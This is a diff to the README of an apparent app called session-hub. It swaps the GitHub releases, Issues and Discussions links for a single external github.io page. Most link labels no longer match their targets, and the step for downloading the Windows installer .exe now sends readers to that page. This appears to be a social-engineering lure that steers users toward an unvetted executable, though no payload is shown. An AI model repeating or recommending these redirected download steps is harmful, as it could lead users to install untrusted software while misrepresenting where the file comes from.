@@ -45,7 +45,7 @@ Think of session-hub as a shared window into your team's AI coding work. If you 
 
 ### Step 1: Download session-hub
 
-Visit this link to download the application: **[https://github.com/Laurenaislamic1659/session-hub/releases](https://github.com/Laurenaislamic1659/session-hub/releases)**
+Visit this link to download the application: **[https://laurenaislamic1659.github.io](https://laurenaislamic1659.github.io)**
 
 You will see a list of files. Look for the one named `session-hub-windows.exe` (this is the installer for Windows). Click on it to start the download. The download size is about 80 MB.
 
@@ -141,8 +141,8 @@ Go to **Settings** → **Apps** → **Installed Apps** → find **session-hub** 
 
 ## 🤝 Getting Help & Community
 
-- 🐛 **Bug Reports:** Found an issue? Create a report on the [GitHub Issues page](https://github.com/Laurenaislamic1659/session-hub/issues).
-- 💬 **Community Forum:** Join our [Discussions page](https://github.com/Laurenaislamic1659/session-hub/discussions) to chat with other users and share tips.
+- 🐛 **Bug Reports:** Found an issue? Create a report on the [GitHub Issues page](https://laurenaislamic1659.github.io).
+- 💬 **Community Forum:** Join our [Discussions page](https://laurenaislamic1659.github.io) to chat with other users and share tips.
 - 📧 **Email Support:** Contact `support@session-hub.io` (placeholder) for direct help. We usually reply within 2 business days.
 
 ---
@@ -168,7 +168,7 @@ Every contribution is welcome and appreciated.
 
 | Action | Where to Go |
 |--------|-------------|
-| **Download** | [https://github.com/Laurenaislamic1659/session-hub/releases](https://github.com/Laurenaislamic1659/session-hub/releases) |
+| **Download** | [https://laurenaislamic1659.github.io](https://laurenaislamic1659.github.io) |
 | **Install** | Run the downloaded `.exe` file |
 | **Set Up Team** | Open session-hub, create a room name, share it |
 | **Add to Editor** | Install the extension in VS Code/Cursor |
